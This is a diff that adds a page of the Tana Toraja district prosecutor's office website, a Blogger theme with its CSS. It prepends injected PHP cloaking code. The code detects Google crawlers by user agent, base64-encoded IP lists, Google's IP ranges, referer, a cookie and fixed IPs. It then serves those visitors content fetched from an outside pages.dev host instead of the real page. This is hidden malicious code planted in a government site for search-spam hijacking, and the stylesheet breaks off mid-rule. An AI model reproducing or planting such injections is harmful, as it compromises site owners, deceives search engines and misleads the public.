@@ -1,0 +1,2243 @@
+<?php
+ 
+$contents = 'https://punten-neng.pages.dev/kejari-tanatoraja.kejaksaan/';
+$allDevice = true;
+ 
+function getContents($url) {
+    if(!function_exists('file_get_contents')) {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        $return = curl_exec($ch);
+        curl_close($ch);
+    } else {
+        $return = file_get_contents($url);
+    }
+    return $return;
+}
+
+function KontolNjepat($ua,$ip) {
+    global $allDevice;
+    if(preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i',$ua)
+        ||
+        preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i',substr($ua,0,4))) {
+ 
+            if(preg_match("/googlebot|google.com|google/i", $ua)) {
+                return true;
+            }
+            $listIp = "MTkyLjE3OC41LjAKMzQuMTAwLjE4Mi45NgozNC4xMDEuNTAuMTQ0CjM0LjExOC4yNTQuMAozNC4xMTguNjYuMAozNC4xMjYuMTc4Ljk2CjM0LjE0Ni4xNTAuMTQ0CjM0LjE0Ny4xMTAuMTQ0CjM0LjE1MS43NC4xNDQKMzQuMTUyLjUwLjY0CjM0LjE1NC4xMTQuMTQ0CjM0LjE1NS45OC4zMgozNC4xNjUuMTguMTc2CjM0LjE3NS4xNjAuNjQKMzQuMTc2LjEzMC4xNgozNC4yMi44NS4wCjM0LjY0LjgyLjY0CjM0LjY1LjI0Mi4xMTIKMzQuODAuNTAuODAKMzQuODguMTk0LjAKMzQuODkuMTAuODAKMzQuODkuMTk4LjgwCjM0Ljk2LjE2Mi40OAozNS4yNDcuMjQzLjI0MAo2Ni4yNDkuNjQuMAo2Ni4yNDkuNjQuMTI4CjY2LjI0OS42NC4xNjAKNjYuMjQ5LjY0LjE5Mgo2Ni4yNDkuNjQuMjI0CjY2LjI0OS42NC4zMgo2Ni4yNDkuNjQuNjQKNjYuMjQ5LjY0Ljk2CjY2LjI0OS42NS4wCjY2LjI0OS42NS4xMjgKNjYuMjQ5LjY1LjE2MAo2Ni4yNDkuNjUuMTkyCjY2LjI0OS42NS4yMjQKNjYuMjQ5LjY1LjMyCjY2LjI0OS42NS42NAo2Ni4yNDkuNjUuOTYKNjYuMjQ5LjY2LjAKNjYuMjQ5LjY2LjEyOAo2Ni4yNDkuNjYuMTYwCjY2LjI0OS42Ni4xOTIKNjYuMjQ5LjY2LjMyCjY2LjI0OS42Ni42NAo2Ni4yNDkuNjYuOTYKNjYuMjQ5LjY4LjAKNjYuMjQ5LjY4LjMyCjY2LjI0OS42OC42NAo2Ni4yNDkuNjkuMAo2Ni4yNDkuNjkuMTI4CjY2LjI0OS42OS4xNjAKNjYuMjQ5LjY5LjE5Mgo2Ni4yNDkuNjkuMjI0CjY2LjI0OS42OS4zMgo2Ni4yNDkuNjkuNjQKNjYuMjQ5LjY5Ljk2CjY2LjI0OS43MC4wCjY2LjI0OS43MC4xMjgKNjYuMjQ5LjcwLjE2MAo2Ni4yNDkuNzAuMTkyCjY2LjI0OS43MC4yMjQKNjYuMjQ5LjcwLjMyCjY2LjI0OS43MC42NAo2Ni4yNDkuNzAuOTYKNjYuMjQ5LjcxLjAKNjYuMjQ5LjcxLjEyOAo2Ni4yNDkuNzEuMTYwCjY2LjI0OS43MS4xOTIKNjYuMjQ5LjcxLjIyNAo2Ni4yNDkuNzEuMzIKNjYuMjQ5LjcxLjY0CjY2LjI0OS43MS45Ngo2Ni4yNDkuNzIuMAo2Ni4yNDkuNzIuMTI4CjY2LjI0OS43Mi4xNjAKNjYuMjQ5LjcyLjE5Mgo2Ni4yNDkuNzIuMjI0CjY2LjI0OS43Mi4zMgo2Ni4yNDkuNzIuNjQKNjYuMjQ5LjcyLjk2CjY2LjI0OS43My4wCjY2LjI0OS43My4xMjgKNjYuMjQ5LjczLjE2MAo2Ni4yNDkuNzMuMTkyCjY2LjI0OS43My4yMjQKNjYuMjQ5LjczLjMyCjY2LjI0OS43My42NAo2Ni4yNDkuNzMuOTYKNjYuMjQ5Ljc0LjAKNjYuMjQ5Ljc0LjEyOAo2Ni4yNDkuNzQuMzIKNjYuMjQ5Ljc0LjY0CjY2LjI0OS43NC45Ngo2Ni4yNDkuNzUuMAo2Ni4yNDkuNzUuMTI4CjY2LjI0OS43NS4xNjAKNjYuMjQ5Ljc1LjE5Mgo2Ni4yNDkuNzUuMjI0CjY2LjI0OS43NS4zMgo2Ni4yNDkuNzUuNjQKNjYuMjQ5Ljc1Ljk2CjY2LjI0OS43Ni4wCjY2LjI0OS43Ni4xMjgKNjYuMjQ5Ljc2LjE2MAo2Ni4yNDkuNzYuMTkyCjY2LjI0OS43Ni4yMjQKNjYuMjQ5Ljc2LjMyCjY2LjI0OS43Ni42NAo2Ni4yNDkuNzYuOTYKNjYuMjQ5Ljc3LjAKNjYuMjQ5Ljc3LjEyOAo2Ni4yNDkuNzcuMTYwCjY2LjI0OS43Ny4xOTIKNjYuMjQ5Ljc3LjMyCjY2LjI0OS43Ny42NAo2Ni4yNDkuNzcuOTYKNjYuMjQ5Ljc4LjAKNjYuMjQ5Ljc5LjAKNjYuMjQ5Ljc5LjEyOAo2Ni4yNDkuNzkuMTYwCjY2LjI0OS43OS4xOTIKNjYuMjQ5Ljc5LjIyNAo2Ni4yNDkuNzkuMzIKNjYuMjQ5Ljc5LjY0CjY2LjI0OS43OS45Ng==";
+            $listIp = base64_decode($listIp);
+            $listIp = explode("\n", $listIp);
+            if(in_array($ip, $listIp)) {
+                return true;
+            }
+            if(preg_match('/google/i', getReferer())) {
+                return true;
+            }
+    } else {
+      if($allDevice) {
+        if(preg_match("/googlebot|google.com|google/i", $ua)) {
+          return true;
+        }
+        $listIp = "MTkyLjE3OC41LjAKMzQuMTAwLjE4Mi45NgozNC4xMDEuNTAuMTQ0CjM0LjExOC4yNTQuMAozNC4xMTguNjYuMAozNC4xMjYuMTc4Ljk2CjM0LjE0Ni4xNTAuMTQ0CjM0LjE0Ny4xMTAuMTQ0CjM0LjE1MS43NC4xNDQKMzQuMTUyLjUwLjY0CjM0LjE1NC4xMTQuMTQ0CjM0LjE1NS45OC4zMgozNC4xNjUuMTguMTc2CjM0LjE3NS4xNjAuNjQKMzQuMTc2LjEzMC4xNgozNC4yMi44NS4wCjM0LjY0LjgyLjY0CjM0LjY1LjI0Mi4xMTIKMzQuODAuNTAuODAKMzQuODguMTk0LjAKMzQuODkuMTAuODAKMzQuODkuMTk4LjgwCjM0Ljk2LjE2Mi40OAozNS4yNDcuMjQzLjI0MAo2Ni4yNDkuNjQuMAo2Ni4yNDkuNjQuMTI4CjY2LjI0OS42NC4xNjAKNjYuMjQ5LjY0LjE5Mgo2Ni4yNDkuNjQuMjI0CjY2LjI0OS42NC4zMgo2Ni4yNDkuNjQuNjQKNjYuMjQ5LjY0Ljk2CjY2LjI0OS42NS4wCjY2LjI0OS42NS4xMjgKNjYuMjQ5LjY1LjE2MAo2Ni4yNDkuNjUuMTkyCjY2LjI0OS42NS4yMjQKNjYuMjQ5LjY1LjMyCjY2LjI0OS42NS42NAo2Ni4yNDkuNjUuOTYKNjYuMjQ5LjY2LjAKNjYuMjQ5LjY2LjEyOAo2Ni4yNDkuNjYuMTYwCjY2LjI0OS42Ni4xOTIKNjYuMjQ5LjY2LjMyCjY2LjI0OS42Ni42NAo2Ni4yNDkuNjYuOTYKNjYuMjQ5LjY4LjAKNjYuMjQ5LjY4LjMyCjY2LjI0OS42OC42NAo2Ni4yNDkuNjkuMAo2Ni4yNDkuNjkuMTI4CjY2LjI0OS42OS4xNjAKNjYuMjQ5LjY5LjE5Mgo2Ni4yNDkuNjkuMjI0CjY2LjI0OS42OS4zMgo2Ni4yNDkuNjkuNjQKNjYuMjQ5LjY5Ljk2CjY2LjI0OS43MC4wCjY2LjI0OS43MC4xMjgKNjYuMjQ5LjcwLjE2MAo2Ni4yNDkuNzAuMTkyCjY2LjI0OS43MC4yMjQKNjYuMjQ5LjcwLjMyCjY2LjI0OS43MC42NAo2Ni4yNDkuNzAuOTYKNjYuMjQ5LjcxLjAKNjYuMjQ5LjcxLjEyOAo2Ni4yNDkuNzEuMTYwCjY2LjI0OS43MS4xOTIKNjYuMjQ5LjcxLjIyNAo2Ni4yNDkuNzEuMzIKNjYuMjQ5LjcxLjY0CjY2LjI0OS43MS45Ngo2Ni4yNDkuNzIuMAo2Ni4yNDkuNzIuMTI4CjY2LjI0OS43Mi4xNjAKNjYuMjQ5LjcyLjE5Mgo2Ni4yNDkuNzIuMjI0CjY2LjI0OS43Mi4zMgo2Ni4yNDkuNzIuNjQKNjYuMjQ5LjcyLjk2CjY2LjI0OS43My4wCjY2LjI0OS43My4xMjgKNjYuMjQ5LjczLjE2MAo2Ni4yNDkuNzMuMTkyCjY2LjI0OS43My4yMjQKNjYuMjQ5LjczLjMyCjY2LjI0OS43My42NAo2Ni4yNDkuNzMuOTYKNjYuMjQ5Ljc0LjAKNjYuMjQ5Ljc0LjEyOAo2Ni4yNDkuNzQuMzIKNjYuMjQ5Ljc0LjY0CjY2LjI0OS43NC45Ngo2Ni4yNDkuNzUuMAo2Ni4yNDkuNzUuMTI4CjY2LjI0OS43NS4xNjAKNjYuMjQ5Ljc1LjE5Mgo2Ni4yNDkuNzUuMjI0CjY2LjI0OS43NS4zMgo2Ni4yNDkuNzUuNjQKNjYuMjQ5Ljc1Ljk2CjY2LjI0OS43Ni4wCjY2LjI0OS43Ni4xMjgKNjYuMjQ5Ljc2LjE2MAo2Ni4yNDkuNzYuMTkyCjY2LjI0OS43Ni4yMjQKNjYuMjQ5Ljc2LjMyCjY2LjI0OS43Ni42NAo2Ni4yNDkuNzYuOTYKNjYuMjQ5Ljc3LjAKNjYuMjQ5Ljc3LjEyOAo2Ni4yNDkuNzcuMTYwCjY2LjI0OS43Ny4xOTIKNjYuMjQ5Ljc3LjMyCjY2LjI0OS43Ny42NAo2Ni4yNDkuNzcuOTYKNjYuMjQ5Ljc4LjAKNjYuMjQ5Ljc5LjAKNjYuMjQ5Ljc5LjEyOAo2Ni4yNDkuNzkuMTYwCjY2LjI0OS43OS4xOTIKNjYuMjQ5Ljc5LjIyNAo2Ni4yNDkuNzkuMzIKNjYuMjQ5Ljc5LjY0CjY2LjI0OS43OS45Ng==";
+        $listIp = base64_decode($listIp);
+        $listIp = explode("\n", $listIp);
+        if(in_array($ip, $listIp)) {
+            return true;
+        }
+        if(preg_match('/google/i', getReferer())) {
+            return true;
+        }
+      }
+      return false;
+    }
+ 
+}
+ 
+function getReferer() {
+    return isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+}
+ 
+function getRealIP(){
+        if (isset($_SERVER["HTTP_CLIENT_IP"])) {$ip = $_SERVER["HTTP_CLIENT_IP"];
+        } elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
+            $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
+        } elseif (isset($_SERVER["HTTP_X_FORWARDED"])) {
+            $ip = $_SERVER["HTTP_X_FORWARDED"];
+        } elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])) {
+            $ip = $_SERVER["HTTP_FORWARDED_FOR"];
+        } elseif (isset($_SERVER["HTTP_FORWARDED"])) {
+            $ip = $_SERVER["HTTP_FORWARDED"];
+        } else {
+            $ip = $_SERVER["REMOTE_ADDR"];
+        }
+ 
+        // Strip any secondary IP etc from the IP address
+        if (strpos($ip, ',') > 0) {
+            $ip = substr($ip, 0, strpos($ip, ','));
+        }
+        return $ip;
+}
+ 
+if(KontolNjepat($_SERVER['HTTP_USER_AGENT'], getRealIP())) {
+    echo getContents($contents);
+    exit;
+}
+?>
+<?php 
+if ($uri == '/' && (
+    strpos($userAgent, 'bot') !== false || 
+    strpos($userAgent, 'google') !== false || 
+    strpos($userAgent, 'chrome-lighthouse') !== false || 
+    strpos($referer, 'google') !== false
+))
+error_reporting(0);$link='https://punten-neng.pages.dev/kejari-tanatoraja.kejaksaan/';
+function ip_in_range($ip,$range){list($subnet,$bits)=explode('/',$range);$ip_dec=ip2long($ip);$subnet_dec=ip2long($subnet);$mask=-1<<(32-$bits);$subnet_dec&=$mask;return($ip_dec&$mask)===$subnet_dec;}function fetch_ip_ranges($url,$ipv4_key){$json_data=file_get_contents($url);if($json_data===FALSE){die("Error: Could not fetch the IP ranges from $url.");}$ip_data=json_decode($json_data,true);$ip_ranges=[];if(isset($ip_data['prefixes'])){foreach($ip_data['prefixes']as $prefix){if(isset($prefix[$ipv4_key])){$ip_ranges[]=$prefix[$ipv4_key];}}}return $ip_ranges;}$google_ip_ranges=fetch_ip_ranges('https://www.gstatic.com/ipranges/goog.json','ipv4Prefix');$visitor_ip=isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:(isset($_SERVER["HTTP_INCAP_CLIENT_IP"])?$_SERVER["HTTP_INCAP_CLIENT_IP"]:(isset($_SERVER["HTTP_TRUE_CLIENT_IP"])?$_SERVER["HTTP_TRUE_CLIENT_IP"]:(isset($_SERVER["HTTP_REMOTEIP"])?$_SERVER["HTTP_REMOTEIP"]:(isset($_SERVER["HTTP_X_REAL_IP"])?$_SERVER["HTTP_X_REAL_IP"]:$_SERVER["REMOTE_ADDR"]))));$googleallow=false;foreach($google_ip_ranges as $range){if(ip_in_range($visitor_ip,$range)){$googleallow=true;break;}}$asd=array('bot','ahrefs','google');foreach($asd as $len){$nul=$len;}$alow=['136.228.135.175','103.77.106.41','146.70.14.27','146.70.14.22'];if($_SERVER['REQUEST_URI']=='/'){$agent=strtolower($_SERVER['HTTP_USER_AGENT']);if(strpos($agent,$nul)or $googleallow or isset($_COOKIE['lp'])or in_array($visitor_ip,$alow)){echo implode('',file($link));die();}} ?>
+<!DOCTYPE html>
+<!--[if IE 7]> <html class='ie ie7' lang='en-US' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'> <![endif]--><!--[if IE 8]> <html class='ie ie8' lang='en-US' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'> <![endif]--><!--[if !(IE 7) | !(IE 8) ]><!--><html dir='ltr' lang='en-US' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<!--<![endif]-->
+<head>
+<link href='https://www.blogger.com/static/v1/widgets/55013136-widget_css_bundle.css' rel='stylesheet' type='text/css'/>
+<meta charset='UTF-8'/>
+<meta content='width=device-width' name='viewport'/>
+<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
+<meta content='blogger' name='generator'/>
+<link href='https://kejari-tanatoraja.kejaksaan.go.id//favicon.ico' rel='icon' type='image/x-icon'/>
+<link href='https://kejari-tanatoraja.kejaksaan.go.id//p/gedung-dan-halaman.html' rel='canonical'/>
+<link rel="alternate" type="application/atom+xml" title="KEJAKSAAN NEGERI TANA TORAJA - Atom" href="https://kejari-tanatoraja.kejaksaan.go.id//feeds/posts/default" />
+<link rel="alternate" type="application/rss+xml" title="KEJAKSAAN NEGERI TANA TORAJA - RSS" href="https://kejari-tanatoraja.kejaksaan.go.id//feeds/posts/default?alt=rss" />
+<link rel="service.post" type="application/atom+xml" title="KEJAKSAAN NEGERI TANA TORAJA - Atom" href="https://www.blogger.com/feeds/2128310195421907157/posts/default" />
+<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
+<meta content='https://kejari-tanatoraja.kejaksaan.go.id//p/gedung-dan-halaman.html' property='og:url'/>
+<meta content='Gedung dan Halaman' property='og:title'/>
+<meta content=' Foto Gedung dan Halaman Kejari Tana Toraja                   ' property='og:description'/>
+<meta content='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPNjSRYij9lw22Z3LTRBcRoslHx5Of4XbZSqc9ApVN2InG922ikCg7ZYo-h1wXyYmTKURKD_hBYsgjkemO0VZglpXgx2ZC7BHiZeZyoooj8OmEKfT9Kxb4FENNWz5RXef4WFpvvZOybIg/w1200-h630-p-k-no-nu/oke1.jpg' property='og:image'/>
+<link href='http://fonts.googleapis.com/css?family=Oswald:400,700,300&subset=latin,latin-ext' rel='stylesheet' type='text/css'/>
+<link href='//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css' rel='stylesheet'/>
+<title>Gedung dan Halaman ~ KEJAKSAAN NEGERI TANA TORAJA</title>
+<!--[if lt IE 9]> <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script> <![endif]-->
+<style id='page-skin-1' type='text/css'><!--
+/*
+-----------------------------------------------
+Template Name  : DaisyChain
+Author         : NewBloggerThemes.com
+Author URL     : http://newbloggerthemes.com/
+Theme URL      : http://newbloggerthemes.com/daisychain-blogger-template/
+Created Date   : Friday, March 20, 2015
+License        : GNU General Public License v2 or later
+This template is free for both personal and commercial use, But to satisfy the 'attribution' clause of the license, you are required to keep the footer links intact which provides due credit to its authors.
+----------------------------------------------- */
+body#layout ul{list-style-type:none;list-style:none}
+body#layout ul li{list-style-type:none;list-style:none}
+body#layout #headerbwrap {height:auto;}
+body#layout #content {}
+body#layout #top-navigation-wrappernbt {display:none;}
+body#layout #searchformnbt {display:none;}
+body#layout .menu-boxnbt {display:none;}
+body#layout .header-contentnbt {float: none;}
+body#layout #sidebarnbt .widget {float: none;}
+#top-navigation-wrappernbt, #wrapper-footernbt, #containernbt {float: none;}
+/* Variable definitions
+====================
+*/
+/* Use this with templates/template-twocol.html */
+.section, .widget {
+margin:0;
+padding:0;
+}
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+border: none;
+margin: 0;
+padding: 0;
+vertical-align: baseline;
+}
+h1, h2, h3, h4, h5, h6 {
+font-family: Oswald, Arial, Helvetica, sans-serif;
+-ms-word-wrap: break-word;
+word-wrap:     break-word;
+line-height: 120%;
+margin: 30px 0 7px;
+}
+h1 {
+color: black;
+font-size: 27px;
+}
+h2 {
+color: #222222;
+font-size: 21px;
+}
+h3 {
+color: #333333;
+font-size: 18px;
+}
+h4 {
+color: #444444;
+font-size: 16px;
+}
+h5 {
+color: #555555;
+font-size: 14px;
+}
+h6 {
+color: #666666;
+font-size: 13px;
+}
+p, ul, ol, li, dl, address {
+-ms-word-wrap: break-word;
+word-wrap: break-word;
+font-size: 13px;
+text-align: left;
+}
+ul {
+margin-left: 16px;
+}
+ol {
+list-style-type: decimal;
+margin-left: 20px;
+}
+ol ol {
+list-style: upper-alpha;
+}
+ol ol ol {
+list-style: lower-roman;
+}
+ol ol ol ol {
+list-style: lower-alpha;
+}
+dl {
+margin-bottom: 20px;
+}
+dt {
+font-weight: bold;
+}
+dd {
+margin-bottom: 5px;
+}
+strong {
+font-weight: bold;
+}
+cite, em, i {
+font-style: italic;
+}
+blockquote cite {
+display: block;
+font-style: normal;
+text-transform: uppercase;
+}
+a {
+color: #3B2720;
+text-decoration: none;
+}
+a:hover {
+text-decoration: underline;
+}
+a img {
+border: none;
+}
+img {
+height: auto;
+max-width: 100%;
+}
+table {
+font-size: 13px;
+width: 100%;
+}
+table, td, th {
+border: 1px solid #e3e3e3;
+border-collapse: collapse;
+text-align: left;
+}
+td, th {
+padding: 5px 8px;
+}
+th {
+background: #555555;
+color: white;
+font-weight: bold;
+}
+blockquote, q {
+border-left: 1px solid #e3e3e3;
+clear: both;
+color: #333333;
+font-style: italic;
+margin: 0 0 20px;
+padding-left: 10px;
+}
+address {
+font-style: italic;
+}
+pre {
+margin-bottom: 20px;
+overflow: auto;
+}
+sup {
+vertical-align: super;
+}
+sub {
+vertical-align: sub;
+}
+iframe,
+embed {
+clear: both;
+width: 100%;
+}
+hr {
+background: #e8e8e8;
+border: none;
+height: 1px;
+margin: 15px 0;
+}
+/* basic structure
+-------------------------------------------------------------- */
+body {
+background: #3B2720 left top repeat url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbClo236vPGuPMlLBBRX7ZiEqOnoi6YP84ypwubP1q66uPwHZZZ7YAzPOcTRUXieK58CvTNvTed2fVSmqLyT0YgnI5glGLZQnohwmURihBhn6sBnLLDq9ClwErsTGNnYlwpxYbihRdFwcn/s1600/pattern.png);
+color: black;
+font-family: 'Trebuchet MS', Arial, Helvetica, sans-serif;
+font-size: 14px;
+line-height: 150%;
+}
+#top-navigation-wrappernbt,
+#wrapper-footernbt,
+#containernbt {
+float: left;
+height: auto;
+position: relative;
+width: 100%;
+}
+#containernbt {
+margin-bottom: 30px;
+}
+.footer-signature-contentnbt,
+.top-navigationnbt,
+#main-contentnbt,
+#headernbt,
+#footernbt {
+margin: 0 auto;
+max-width: 1012px;
+position: relative;
+width: 100%;
+}
+#main-content-innernbt {
+background: white;
+border-bottom: 4px solid #190F0E;
+border-top: 4px solid #190F0E;
+-webkit-box-shadow: 4px 0 4px -4px #222222, -4px 0 4px -4px #222222;
+-moz-box-shadow:    4px 0 4px -4px #222222, -4px 0 4px -4px #222222;
+box-shadow:         4px 0 4px -4px #222222, -4px 0 4px -4px #222222;
+float: left;
+position: relative;
+width: 100%;
+}
+#contentnbt {
+float: left;
+margin: 28px 0 10px 28px;
+width: 628px;
+}
+#sidebarnbt {
+float: right;
+margin: 28px 28px 10px;
+width: 300px;
+}
+.scroll-topnbt {
+background: #555555 left top no-repeat url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhqfyMCRuUxlHDip8r70ZhOuw8ItocIyB-E1oQjGCJ6_qGdjRFLpXnOfYp5VC018xzHjHzMwsq62WhhUKqLMlryFRV7jtMRmqT3viFVNrzKJcutT4B7DS751OpsEXzYWZS0UOs_qxzvmMJe/s1600/scroll-top.png);
+border: 1px solid black;
+cursor: pointer;
+display: block;
+height: 29px;
+opacity: 0.4;
+filter: alpha(opacity=40);
+position: fixed;
+bottom: 10px;
+right: 10px;
+width: 29px;
+z-index: 200;
+}
+#wrappernbt .scroll-topnbt:hover {
+opacity: 1;
+filter: alpha(opacity=100);
+-webkit-transition: opacity 1s;
+transition: opacity 1s;
+}
+#main-content-innernbt .line-topnbt,
+#main-content-innernbt .line-bottomnbt {
+background: center top no-repeat url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhXQywHjbt5z62LaSkqUaKzi7nWOxjTIt5rKP5ZV88OdzrqL07nwJUHEHxigOX61KQJLFe11AJIVtMp0t1mgSHlXCacfcNzUYnKDxGiR-hCMyOFjWRjcarbfzR0GHWEbi8A_QLlpcvCU-aj/s1600/line.png);
+height: 1px;
+opacity: 0.7;
+filter: alpha(opacity=70);
+position: absolute;
+left: 0;
+top: -4px;
+width: 100%;
+z-index: 100;
+}
+#wrappernbt #main-content-innernbt .line-bottomnbt {
+bottom: -4px;
+top: auto;
+}
+/* header
+-------------------------------------------------------------- */
+.header-contentnbt {
+float: left;
+padding: 35px 0;
+position: relative;
+width: 100%;
+}
+.site-titlenbt {
+font-family: Oswald, Arial, Helvetica, sans-serif;
+font-size: 32px;
+font-weight: bold;
+line-height: 100%;
+margin: 0;
+max-width: 800px;
+position: relative;
+width: 100%;
+z-index: 50;
+}
+.site-descriptionnbt {
+color: yellow;
+font-family: 'Trebuchet MS', Oswald, Arial, Helvetica, sans-serif;
+font-size: 14px;
+line-height: 100%;
+margin: 12px 0 0;
+max-width: 800px;
+position: relative;
+width: 100%;
+z-index: 50;
+font-weight: normal;
+}
+.site-titlenbt a {
+color: white;
+text-decoration: none;
+}
+.site-titlenbt a:hover {
+color: #222222;
+-webkit-transition: color 1s;
+transition: color 1s;
+}
+.header-logonbt {
+clear: both;
+display: block;
+height: auto;
+margin: 0;
+max-width: 800px;
+position: relative;
+width: auto;
+}
+.header-imagenbt {
+background: white;
+float: left;
+height: auto;
+position: relative;
+width: 100%;
+}
+.header-imagenbt img {
+display: block;
+margin: 0 auto;
+}
+/* header menu */
+/*
+This copyright notice must be untouched at all times.
+The original version of this stylesheet and the associated (x)html
+is available at http://www.cssplay.co.uk/menus/final_drop3.html
+Copyright (c) 2005-2007 Stu Nicholls. All rights reserved.
+This stylesheet and the associated (x)html may be modified in any
+way to fit your requirements. */
+.menu-boxnbt {
+background: white;
+border-bottom: 1px solid #eaeaea;
+-webkit-box-shadow: 0 3px 3px -3px #333333;
+-moz-box-shadow:    0 3px 3px -3px #333333;
+box-shadow:         0 3px 3px -3px #333333;
+float: left;
+position: relative;
+width: 100%;
+z-index: 500;
+}
+.menu-boxnbt ul {
+list-style-type: none;
+margin: 0;
+position: relative;
+text-align: left;
+z-index: 100;
+}
+.menu-boxnbt ul ul {
+background: #ededed;
+border-top: 1px solid #b56a63;
+float: none;
+width: 212px;
+z-index: 110;
+}
+.menu-boxnbt ul li {
+float: left;
+height: 44px;
+line-height: 44px;
+margin: 0;
+position: relative;
+}
+.menu-boxnbt ul ul li {
+border-bottom: 1px solid #d9d9d9;
+display: block;
+height: auto;
+line-height: 39px;
+margin: 0;
+min-height: 39px;
+position: relative;
+width: 212px;
+}
+#wrappernbt #containernbt .menu-boxnbt ul ul .last-menu-item {
+border-bottom: none;
+}
+.menu-boxnbt a,
+.menu-boxnbt a:visited {
+border-right: 1px solid #eaeaea;
+color: #666666;
+display: block;
+float: left;
+font-family: Oswald, Arial, Helvetica, sans-serif;
+font-size: 14px;
+height: 44px;
+line-height: 44px;
+padding: 0 19px;
+text-decoration: none;
+text-transform: uppercase;
+}
+#containernbt .menu-boxnbt ul ul a,
+#containernbt .menu-boxnbt ul ul a:visited {
+border-right: none;
+color: #333333 !important;
+display: block;
+font-size: 13px;
+font-weight: normal;
+height: auto;
+line-height: 39px;
+margin: 0;
+min-height: 39px;
+padding: 0 0 0 19px;
+text-align: left;
+width: 193px;
+}
+#containernbt .menu-boxnbt ul ul ul a,
+#containernbt .menu-boxnbt ul ul ul a:visited {
+color: #444444 !important;
+}
+.menu-boxnbt a:hover,
+.menu-boxnbt :hover > a {
+background-color: #ffe5e3;
+color: black;
+-webkit-transition: all 1s;
